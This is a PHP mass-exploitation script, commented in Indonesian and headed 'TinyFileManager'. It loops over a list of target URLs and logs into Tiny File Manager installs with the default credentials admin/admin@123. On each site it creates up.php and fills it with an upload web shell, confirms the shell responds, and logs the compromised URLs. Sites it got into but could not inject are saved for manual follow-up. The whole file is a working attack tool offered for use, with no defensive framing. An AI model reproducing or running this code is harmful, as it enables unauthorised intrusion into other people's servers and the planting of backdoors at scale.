<?php
/**
 * TinyFileManager 
 */

// --- KONFIGURASI ---
$username = "admin";
$password = "admin@123";
$listFile = "list.txt";
$successAuto = "auto_success.txt"; // File terinjeksi otomatis
$manualCheck = "manual_login.txt"; // Berhasil login tapi gagal buat file

$shellName = "up.php";
// Payload
$shellContent = '<?php echo "ALIVE"; if($_FILES["f"]){move_uploaded_file($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]);echo "OK";} ?><form method="POST" enctype="multipart/form-data"><input type="file" name="f"><input type="submit"></form>';

error_reporting(E_ALL & ~E_DEPRECATED & ~E_WARNING);

if (!file_exists($listFile)) die("[-] list.txt tidak ditemukan!\n");
$urls = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

echo "\033[1;34m[*] Memulai proses pada " . count($urls) . " target...\033[0m\n";

foreach ($urls as $targetUrl) {
    $targetUrl = trim($targetUrl);
    echo "\n\033[1;36m[=]\033[0m Target: $targetUrl\n";

    $ch = curl_init();
    $cookie = tempnam(sys_get_temp_dir(), 'TFM');
    
    // --- 1. DETEKSI CSRF TOKEN ---
    curl_setopt_array($ch, [
        CURLOPT_URL => $targetUrl,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_COOKIEJAR => $cookie,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_TIMEOUT => 15
    ]);
    $res = curl_exec($ch);
    preg_match('/name="token" value="([^"]+)"/', $res, $match);
    $token = $match[1] ?? '';

    // --- 2. LOGIN ---
    echo "[*] Login... ";
    $loginData = ['fm_usr' => $username, 'fm_pwd' => $password];
    if ($token) $loginData['token'] = $token;
    
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($loginData));
    $loginRes = curl_exec($ch);

    if (strpos($loginRes, 'logout') !== false || strpos($loginRes, '?p=') !== false) {
        echo "\033[32mOK\033[0m\n";
    } else {
        echo "\033[31mGAGAL LOGIN\033[0m\n";
        curl_close($ch); @unlink($cookie); continue;
    }

    // --- 3. PROSES BUAT FILE ---
    echo "[*] Mencoba buat file otomatis... ";
    if ($token) {
        // Versi Baru (POST)
        curl_setopt($ch, CURLOPT_URL, $targetUrl . "?p=");
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['newfilename' => $shellName, 'newfile' => 'file', 'token' => $token]));
    } else {
        // Versi Lama (GET)
        curl_setopt($ch, CURLOPT_URL, $targetUrl . "?p=&new=" . urlencode($shellName) . "&type=file");
        curl_setopt($ch, CURLOPT_POST, false);
    }
    curl_exec($ch);

    // --- 4. INJEKSI PAYLOAD ---
    if ($token) {
        $jsonData = json_encode(['ajax' => true, 'type' => 'save', 'content' => $shellContent, 'token' => $token]);
        curl_setopt($ch, CURLOPT_URL, $targetUrl . "?p=&edit=" . $shellName);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, $jsonData);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    } else {
        curl_setopt($ch, CURLOPT_URL, $targetUrl . "?p=&edit=" . $shellName);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query(['savedata' => $shellContent]));
        curl_setopt($ch, CURLOPT_HTTPHEADER, []);
    }
    $saveRes = curl_exec($ch);

    // --- 5. VERIFIKASI ---
    $pUrl = parse_url($targetUrl);
    $scheme = $pUrl['scheme'] ?? 'http';
    $host = $pUrl['host'] ?? '';
    $port = isset($pUrl['port']) ? ":" . $pUrl['port'] : "";
    $dirPath = isset($pUrl['path']) ? dirname($pUrl['path']) : "";
    if ($dirPath == DIRECTORY_SEPARATOR || $dirPath == '.') $dirPath = "";
    $shellUrl = $scheme . "://" . $host . $port . $dirPath . "/" . $shellName;

    curl_setopt($ch, CURLOPT_URL, $shellUrl);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "GET");
    curl_setopt($ch, CURLOPT_HTTPHEADER, []);
    $check = curl_exec($ch);

    if (strpos($check, 'ALIVE') !== false) {
        echo "\033[1;32m[AUTO SUCCESS] $shellUrl\033[0m\n";
        file_put_contents($successAuto, "$shellUrl\n", FILE_APPEND);
    } else {
        echo "\033[1;33m[MANUAL REQUIRED] Berhasil Login tapi gagal injeksi.\033[0m\n";
        file_put_contents($manualCheck, "$targetUrl | $username:$password\n", FILE_APPEND);
    }

    curl_close($ch); @unlink($cookie);
    echo str_repeat("-", 45) . "\n";
}
echo "\n\033[1;32m[+] Selesai!\033[0m";
echo "\n[+] Sukses Otomatis: \033[1;37m$successAuto\033[0m";
echo "\n[+] Manual Login: \033[1;37m$manualCheck\033[0m\n";
